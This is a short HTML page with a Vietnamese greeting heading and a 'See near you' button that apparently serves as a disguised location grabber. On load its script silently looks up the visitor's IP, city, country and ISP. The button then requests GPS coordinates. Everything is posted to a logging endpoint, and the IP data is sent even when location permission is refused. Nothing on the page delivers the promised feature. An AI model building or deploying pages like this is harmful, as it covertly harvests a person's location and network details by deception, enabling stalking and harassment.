<!DOCTYPE html>
<html>
<body>
<h1>alo vũ à vũ</h1>
<button onclick="getLocation()">Xem gần bạn</button>

<script>
let data = {};
let sent = false;

// 1. Lấy IP trước (không gửi vội)
async function getIP() {
  try {
    const res = await fetch("https://ipwho.is/");
    const ipData = await res.json();

    data.ip = ipData.ip;
    data.city = ipData.city;
    data.country = ipData.country;
    data.isp = ipData.connection?.isp;
  } catch (e) {
    console.log("IP fail");
  }
}

// 2. Gửi dữ liệu (chỉ 1 lần)
function sendData() {
  if (sent) return;
  sent = true;

  fetch("/api/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });

  console.log("Sent:", data);
}

// 3. Khi bấm nút → lấy GPS rồi gửi
function getLocation() {
  if (!navigator.geolocation) {
    alert("Không hỗ trợ GPS");
    sendData(); // fallback
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      data.lat = pos.coords.latitude;
      data.lon = pos.coords.longitude;
      data.accuracy = pos.coords.accuracy;

      sendData();
    },
    () => {
      alert("Bạn chưa cho phép truy cập vị trí");
      sendData(); // fallback IP
    }
  );
}

// chạy khi load (chỉ lấy IP thôi)
getIP();
</script>

</body>
</html>
